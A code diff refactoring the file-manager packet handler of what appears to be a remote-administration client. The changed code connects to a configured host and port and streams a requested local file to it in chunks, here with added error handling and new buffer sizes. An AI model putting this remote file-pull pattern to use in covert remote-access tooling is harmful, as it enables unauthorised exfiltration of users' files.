@@ -1,5 +1,5 @@
-﻿using Client.Networking;
-using Client.Settings;
+﻿using ClientWindows.Networking;
+using ClientWindows.Settings;
 using SharedLibraries.Helper;
 using SharedLibraries.Packet.Commands;
 using SharedLibraries.Packet.Interfaces;
@@ -13,7 +13,7 @@ using System.IO;
 using System.Net.Sockets;
 using System.Threading;
 
-namespace Client.PacketHandler
+namespace ClientWindows.PacketHandler
 {
     public class HandleFileManager
     {
@@ -148,9 +148,11 @@ namespace Client.PacketHandler
             FileInfo fileInfo = new FileInfo(packet.FullPath);
             if (fileInfo.Exists)
             {
-                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                try
                 {
                     socket.Connect(Configuration.Host, Configuration.Port);
+                    socket.SendBufferSize = 50 * 1000;
                     if (socket.Connected)
                     {
                         string fileId = Guid.NewGuid().ToString();
@@ -170,32 +172,44 @@ namespace Client.PacketHandler
                             FileId = fileId,
                         }, socket);
 
-                        Thread.Sleep(5000);
                     }
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine(ex.Message);
+                    socket.Dispose();
                 }
             }
         }
 
         private void SendSocket(IPacket packet, Socket socket)
         {
-            byte[] buffer = Serialize.PacketSerialize(packet);
-            byte[] bufferSize = BitConverter.GetBytes(buffer.Length);
-            Debug.WriteLine($"DownloadFile: Sending {buffer.Length}");
-
-            socket.Poll(-1, SelectMode.SelectWrite);
-            socket.Send(bufferSize, 0, bufferSize.Length, SocketFlags.None);
-
-            using (MemoryStream memoryStream = new MemoryStream(buffer))
+            try
             {
-                int read = 0;
-                memoryStream.Position = 0;
-                byte[] chunk = new byte[1000 * 1000];
-                while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                byte[] buffer = Serialize.PacketSerialize(packet);
+                byte[] bufferSize = BitConverter.GetBytes(buffer.Length);
+                Debug.WriteLine($"DownloadFile: Sending {buffer.Length}");
+
+                socket.Poll(-1, SelectMode.SelectWrite);
+                socket.Send(bufferSize, 0, bufferSize.Length, SocketFlags.None);
+
+                using (MemoryStream memoryStream = new MemoryStream(buffer))
                 {
-                    socket.Poll(-1, SelectMode.SelectWrite);
-                    int sent = socket.Send(chunk, 0, read, SocketFlags.None);
-                    Debug.WriteLine($"DownloadFile: Sent {sent}");
+                    int read = 0;
+                    memoryStream.Position = 0;
+                    byte[] chunk = new byte[150 * 1000];
+                    while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
+                    {
+                        socket.Poll(-1, SelectMode.SelectWrite);
+                        int sent = socket.Send(chunk, 0, read, SocketFlags.None);
+                        Debug.WriteLine($"DownloadFile: Sent {sent}");
+                    }
                 }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                return;
             }
         }
     }
